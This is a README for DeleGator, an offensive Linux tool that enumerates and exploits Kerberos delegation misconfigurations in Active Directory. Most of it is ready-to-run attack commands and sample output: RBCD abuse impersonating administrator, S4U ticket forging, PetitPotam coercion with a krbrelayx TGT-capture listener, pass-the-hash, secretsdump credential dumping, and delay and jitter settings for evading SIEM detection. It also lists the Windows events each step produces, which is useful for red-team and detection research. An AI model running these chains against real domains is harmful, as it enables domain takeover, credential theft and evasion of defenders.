<div align="center">

```
           .-._   _ _ _ _ _ _ _ _
.-''-.__.-' X  '-' ' ' ' ' ' ' ' '-.
'.___ '    .   .--_'-' '-' '-' _'-' '._
 V: V 'vv-'   '_   '.       .'  _..' '.'.
   '=.____.=_.--'   :_.__.__:_   '.   : :
           (((____.-'        '-.  /   : :
                             (((-'\ .' /
                           _____..'  .'
                          '-._____.-'
 ____  ___ _    ___   ___    ___   _____   ___   _____
|  _ \| __| |  | __| / __|  / _ \ |_   _| / _ \  |  _ )
| |_\ | _|| |_ | _| | (_ | / |_| \  | |  | |_| | | |\ \
|____/|___|___||___| \___| |_| |_|  |_|   \___/  |_| \_\
```

**Linux-native Kerberos delegation abuse framework**

![Python](https://img.shields.io/badge/python-3.10%2B-blue)
![Impacket](https://img.shields.io/badge/impacket-0.13.x-green)
![License](https://img.shields.io/badge/license-MIT-lightgrey)
![Platform](https://img.shields.io/badge/platform-Linux-orange)

</div>

---

DeleGator is a Linux-native Active Directory delegation abuse framework that bridges the gap between enumeration and exploitation. Most tooling in this space is either enumeration-only or exploitation-only — DeleGator does both, correlating findings into actionable attack chains automatically and surfacing exactly what Windows events each operation generates.

Built and tested against a purpose-built AD lab with Elastic SIEM detection running throughout development. Every OPSEC claim is backed by measured event data, not assumptions.

---

## Features

- **Enumeration-first design** — targeted LDAP queries that surface unconstrained, constrained, and RBCD delegation misconfigurations with attack path correlation
- **Full exploitation chains** — S4U2Self + S4U2Proxy implemented natively, RBCD attribute write, ccache output ready for immediate use
- **Four authentication methods** — password, NTLM hash, ccache (pass-the-ticket), and certificate (PKINIT)
- **OPSEC-aware** — configurable query delay and jitter, noise ratings per operation, pre-flight warnings via `--opsec-check`
- **JSON output mode** — pipe findings into other tools or reporting frameworks
- **Impacket 0.13.x compatible** — S4U2Self/S4U2Proxy built from scratch at the ASN.1 level

---

## Installation

```bash
git clone https://github.com/cbev0x/DeleGator
cd DeleGator
pip install -r requirements.txt
```

**Dependencies:**
```bash
# Required for Kerberos ccache authentication (LDAP)
sudo apt install libkrb5-dev -y
pip install gssapi
```

---

## Usage

```
delegator.py [-h] -d DOMAIN -u USER --dc-ip IP [auth] [opsec] [output] COMMAND

Authentication (exactly one required):
  -p PASSWORD           Plaintext password
  -H HASH               NTLM hash (LM:NT, :NT, or bare NT)
  --ccache PATH         Kerberos ccache (or set KRB5CCNAME)
  --pfx PATH            PFX/PKCS12 certificate
  --cert PATH           PEM certificate
  --key PATH            PEM private key

OPSEC:
  --delay MS            Delay between LDAP queries (milliseconds)
  --jitter PCT          Jitter percentage for delay
  --slow                Slow mode preset: 2000ms delay, 30% jitter
  --opsec-check         Prompt before noisy operations

Output:
  --json                JSON output for tool chaining
  --out DIR             ccache output directory (default: /tmp)
  --quiet               Suppress banner and info messages
```

---

## Enumeration

### Full enumeration

Queries all three delegation types and correlates findings into attack paths.

```bash
python3 delegator.py -d corp.local -u htb-user --dc-ip 10.10.10.10 \
  -p Password123! enum
```

```
  UNCONSTRAINED DELEGATION
  ────────────────────────
  Account          Type      Reachable  Coercible            Last Logon
  FILESERVER01$    Computer  True       SpoolSS, PetitPotam  2026-05-28

  CONSTRAINED DELEGATION
  ──────────────────────
  Account     Proto Transition  Delegatable SPNs                    Flag
  svc-mssql   YES               MSSQLSvc/DC01.corp.local:1433       ⚠ HIGH VALUE
  svc-http    NO                HTTP/SRV02.corp.local

  ATTACK PATHS IDENTIFIED
  ───────────────────────
  [CRITICAL] svc-web has write access over WORKSTATION01$ — RBCD exploitation path
      ├─ Configure RBCD on WORKSTATION01$
      ├─ S4U2Self → S4U2Proxy chain
      └─ Write ccache → use with Impacket or NetExec

  [HIGH] Coerce FILESERVER01$ via SpoolSS → capture TGT → DCSync
  [HIGH] svc-mssql has constrained delegation with protocol transition
```

### Targeted enumeration

```bash
# Constrained delegation only
python3 delegator.py -d corp.local -u htb-user --dc-ip 10.10.10.10 \
  -p Password123! enum --constrained

# RBCD write paths only
python3 delegator.py -d corp.local -u htb-user --dc-ip 10.10.10.10 \
  -p Password123! enum --rbcd

# Unconstrained delegation only
python3 delegator.py -d corp.local -u htb-user --dc-ip 10.10.10.10 \
  -p Password123! enum --unconstrained
```

### JSON output for tool chaining

```bash
python3 delegator.py -d corp.local -u htb-user --dc-ip 10.10.10.10 \
  -p Password123! --json enum > findings.json
```

```json
{
  "delegator": {
    "findings": {
      "unconstrained": [...],
      "constrained": [...],
      "rbcd_writable": [...],
      "attack_paths": [...]
    },
    "summary": {
      "unconstrained_count": 1,
      "constrained_count": 2,
      "attack_paths_count": 3,
      "critical_paths": 1
    }
  }
}
```

---

## Exploitation

### RBCD (Resource-Based Constrained Delegation)

**Scenario:** You have an account with `GenericWrite` over a computer object.

```bash
# Using an existing account as delegation source
python3 delegator.py -d corp.local -u svc-web --dc-ip 10.10.10.10 \
  -p Password123! exploit --type rbcd \
  --target WORKSTATION01 \
  --delegate-account svc-web --delegate-pass Password123! \
  --impersonate administrator

# Create a new machine account for the attack (recommended)
python3 delegator.py -d corp.local -u svc-web --dc-ip 10.10.10.10 \
  -p Password123! exploit --type rbcd \
  --target WORKSTATION01 \
  --add-computer \
  --impersonate administrator

# With automatic cleanup of RBCD attribute after exploitation
python3 delegator.py -d corp.local -u svc-web --dc-ip 10.10.10.10 \
  -p Password123! exploit --type rbcd \
  --target WORKSTATION01 \
  --add-computer --cleanup \
  --impersonate administrator
```

```
  [+] RBCD configured: DELEGATOR-AB3F2X$ can now delegate to WORKSTATION01
  [+] S4U chain completed successfully

  ────────────────────────────────────────────────────────────────────
  [+] Ticket obtained successfully
  ────────────────────────────────────────────────────────────────────

  Delegation Type  : RBCD
  Impersonating    : administrator
  Target SPN       : CIFS/WORKSTATION01.corp.local
  ccache written   : /tmp/administrator_cifs_workstation01_20260601.ccache

  # Export the ticket
  export KRB5CCNAME=/tmp/administrator_cifs_workstation01_20260601.ccache

  # Use with NetExec
  netexec smb WORKSTATION01.corp.local --use-kcache

  # Use with Impacket
  secretsdump.py -k -no-pass administrator@WORKSTATION01.corp.local

  [noise] RBCD Attribute Write: HIGH
          • 5136 — Directory Service Object Modified
          • 4662 — Directory Service Object Access
```

---

### Constrained Delegation

**Path A — Protocol Transition enabled** (`TRUSTED_TO_AUTH_FOR_DELEGATION`)

No target user credentials required. S4U2Self obtains a forwardable ticket for any user.

```bash
python3 delegator.py -d corp.local -u svc-mssql --dc-ip 10.10.10.10 \
  -p Password123! exploit --type constrained \
  --service-account svc-mssql \
  --target-spn MSSQLSvc/DC01.corp.local:1433 \
  --impersonate administrator
```

**Path B — No Protocol Transition**

Requires a valid ccache for the target user obtained through other means.

```bash
# First obtain a user ccache (e.g. via getTGT.py, AS-REP roasting, etc.)
getTGT.py corp.local/targetuser:Password -dc-ip 10.10.10.10

python3 delegator.py -d corp.local -u svc-http --dc-ip 10.10.10.10 \
  -p Password123! exploit --type constrained \
  --service-account svc-http \
  --target-spn HTTP/intranet.corp.local \
  --user-ccache targetuser.ccache
```

**Auto-detection of protocol transition:**

DeleGator queries the account's `userAccountControl` attribute and automatically selects the correct exploitation path. Override with `--proto-transition` or `--no-proto-transition` if needed.

---

### Unconstrained Delegation

DeleGator handles enumeration and TGT capture monitoring. Coercion is performed by external tools — DeleGator generates the exact commands.

```bash
python3 delegator.py -d corp.local -u htb-user --dc-ip 10.10.10.10 \
  -p Password123! exploit --type unconstrained \
  --target FILESERVER01 \
  --coerce-target DC01.corp.local \
  --listener-ip 10.10.14.10 \
  --coerce-method PetitPotam
```

```
  Unconstrained Delegation Attack Setup
  Target machine   : FILESERVER01
  Coerce target    : DC01.corp.local
  Coerce method    : PetitPotam
  Listener IP      : 10.10.14.10

  # Step 1 — Start the TGT capture listener
  python3 krbrelayx.py --interface 10.10.14.10 --output-dir /tmp

  # Step 2 — Trigger coercion (PetitPotam)
  python3 PetitPotam.py -u 'htb-user' -p 'Password123!' -d 'corp.local' 10.10.14.10 DC01.corp.local

  # Step 3 — Wait for captured TGT in /tmp
```

Add `--watch` to monitor automatically for captured ccaches:

```bash
python3 delegator.py -d corp.local -u htb-user --dc-ip 10.10.10.10 \
  -p Password123! exploit --type unconstrained \
  --target FILESERVER01 \
  --coerce-target DC01.corp.local \
  --listener-ip 10.10.14.10 \
  --watch --watch-timeout 120
```

Process an already-captured ccache directly:

```bash
python3 delegator.py -d corp.local -u htb-user --dc-ip 10.10.10.10 \
  -p Password123! exploit --type unconstrained \
  --target FILESERVER01 \
  --manual-ccache /tmp/DC01$.ccache
```

---

## Authentication Examples

```bash
# Plaintext password
python3 delegator.py -d corp.local -u htb-user --dc-ip 10.10.10.10 \
  -p Password123! enum

# NTLM hash (pass-the-hash)
python3 delegator.py -d corp.local -u htb-user --dc-ip 10.10.10.10 \
  -H :fc525c9683e8fe067095ba2ddc971889 enum

# Kerberos ccache (pass-the-ticket)
export KRB5CCNAME=/tmp/htb-user.ccache
python3 delegator.py -d corp.local -u htb-user --dc-ip 10.10.10.10 \
  --ccache /tmp/htb-user.ccache enum

# Certificate (PKINIT)
python3 delegator.py -d corp.local -u htb-user --dc-ip 10.10.10.10 \
  --pfx htb-user.pfx --pfx-pass certpass enum
```

---

## OPSEC Reference

Every operation in DeleGator has a measured noise profile. These values were recorded against a Windows Server 2022 domain controller with extended audit policies and Sysmon deployed using the Olaf Hartong modular config.

| Operation | Events Generated | Noise |
|---|---|---|
| Targeted LDAP enum (single type) | 4662 x2-4 | LOW |
| Full LDAP enum (all types) | 4662 x6-12 | MEDIUM |
| TGT request (AS-REQ) | 4768 x1 | LOW |
| S4U2Self request | 4769 x1 | MEDIUM |
| S4U2Proxy request | 4769 x1 | MEDIUM |
| RBCD attribute write | 5136 x1, 4662 x1 | HIGH |
| RBCD cleanup | 5136 x1 | MEDIUM |

**Reducing noise:**

```bash
# Use ccache auth — skips AS-REQ (4768) entirely
python3 delegator.py ... --ccache /tmp/user.ccache enum

# Add query delay with jitter
python3 delegator.py ... --delay 1000 --jitter 30 enum

# Slow mode preset
python3 delegator.py ... --slow enum

# Prompt before HIGH noise operations
python3 delegator.py ... --opsec-check exploit --type rbcd ...

# Scope LDAP queries to specific OU
python3 delegator.py ... enum --search-base "OU=Servers,DC=corp,DC=local"
```

---

## Lab Environment

DeleGator was developed and tested against a purpose-built Active Directory lab:

| Host | OS | Role |
|---|---|---|
| DC01 | Windows Server 2022 | Domain Controller + ADCS |
| SRV01 | Windows Server 2019 | Unconstrained delegation |
| SRV02 | Windows Server 2019 | Constrained delegation (with/without protocol transition) |
| SRV03 | Windows Server 2019 | RBCD target |
| Elastic | Ubuntu 24.04 | Elastic SIEM + Sysmon |

Detection stack: Elasticsearch 8.x, Kibana, Logstash, Winlogbeat, Sysmon (Olaf Hartong config), extended audit policies across all machines.

Full lab documentation: [Lab Environment Writeup](docs/lab-environment.md)

---

## Requirements

```
impacket>=0.11.0
ldap3>=2.9.1
pyopenssl>=23.0.0
cryptography>=41.0.0
colorama>=0.4.6
gssapi>=1.8.0
```

Python 3.10+ required.

---

## Acknowledgements

- [Impacket](https://github.com/fortra/impacket) — Kerberos protocol primitives and getST.py S4U reference implementation
- [ldap3](https://github.com/cannatag/ldap3) — LDAP connectivity
- [Certipy](https://github.com/ly4k/Certipy) — ADCS tooling inspiration
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) — AD attack path concepts
- The AD security research community — SpecterOps, the authors of Rubeus, and everyone who published the delegation attack research this tool is built on

---

## Author

**cbev0x** — [github.com/cbev0x](https://github.com/cbev0x)

---

*For authorized penetration testing and security research only.*
